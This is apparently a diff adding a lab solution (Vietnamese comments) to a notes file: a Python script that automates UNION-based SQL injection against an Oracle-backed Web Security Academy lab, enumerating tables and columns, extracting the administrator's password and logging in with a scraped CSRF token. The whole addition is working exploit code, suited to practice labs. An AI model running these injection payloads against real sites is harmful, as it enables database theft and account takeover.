@@ -384,3 +384,101 @@ if "Welcome" in response.text or response.status_code == 200:
 else:
     print("Đăng nhập thất bại.")
 ```
+
+# LAB 8.5: SQL injection attack, listing the database contents on Oracle
+```python
+import requests
+from bs4 import BeautifulSoup
+
+print("Gửi URL dưới dạng: https://xxxxx.web-security-academy.net/")
+url = input("Nhập URL: ").rstrip("/")
+
+union_url = f"{url}/filter?category=Gifts'+UNION+SELECT+TABLE_NAME,+NULL+FROM+all_tables--"
+print(f"Thử payload: {union_url}")
+
+response = requests.get(union_url)
+
+if response.status_code == 200:
+    soup = BeautifulSoup(response.text, "html.parser")
+    table_rows = soup.find_all("tr")
+
+    password_found = None
+    for row in table_rows:
+        th = row.find("th")
+        if th:
+            content = th.text.strip()
+            if content.startswith("USERS_"):
+                random = content.split("_", 1)[1]
+                break
+
+union_url = f"{url}/filter?category=Gifts'+UNION+SELECT+COLUMN_NAME,+NULL+FROM+all_tab_columns+WHERE+table_name+=+'USERS_{random}'--"
+print(f"Thử payload: {union_url}")
+
+response = requests.get(union_url)
+
+if response.status_code == 200:
+    soup = BeautifulSoup(response.text, "html.parser")
+    table_rows = soup.find_all("tr")
+
+    random1 = None
+    random2 = None
+    for row in table_rows:
+        th = row.find("th")
+        if th:
+            content = th.text.strip()
+            if content.startswith("USERNAME_") and random1 is None:
+                random1 = content.split("_", 1)[1]
+            elif content.startswith("PASSWORD_") and random2 is None:
+                random2 = content.split("_", 1)[1]
+
+            if random1 is not None and random2 is not None:
+                break
+
+    if random1 is not None and random2 is not None:
+        union_url = f"{url}/filter?category=Gifts'UNION+SELECT+USERNAME_{random1}||':'||PASSWORD_{random2},+NULL+FROM+USERS_{random}+--"
+        print(f"Thử payload: {union_url}")
+        response = requests.get(union_url)
+
+if response.status_code == 200:
+    soup = BeautifulSoup(response.text, "html.parser")
+    table_rows = soup.find_all("tr")
+
+    password_found = None
+    for row in table_rows:
+        th = row.find("th")
+        if th:
+            content = th.text.strip()
+            if content.startswith("administrator:"):
+                password_found = content.split(":", 1)[1]
+                break
+
+
+    if password_found:
+        print(f"Tìm thấy password của administrator: {password_found}")
+    else:
+        print("Không tìm thấy password")
+        exit()
+else:
+    print("Lỗi")
+    exit()
+
+login_url = f"{url}/login"
+session = requests.Session()
+response = session.get(login_url)
+
+soup = BeautifulSoup(response.text, "html.parser")
+csrf_token = soup.find("input", {"name": "csrf"})["value"]
+
+data = {
+    "csrf": csrf_token,
+    "username": "administrator",
+    "password": password_found
+}
+
+response = session.post(login_url, data=data)
+
+if "Welcome" in response.text or response.status_code == 200:
+    print("Đăng nhập thành công!")
+else:
+    print("Đăng nhập thất bại.")
+```
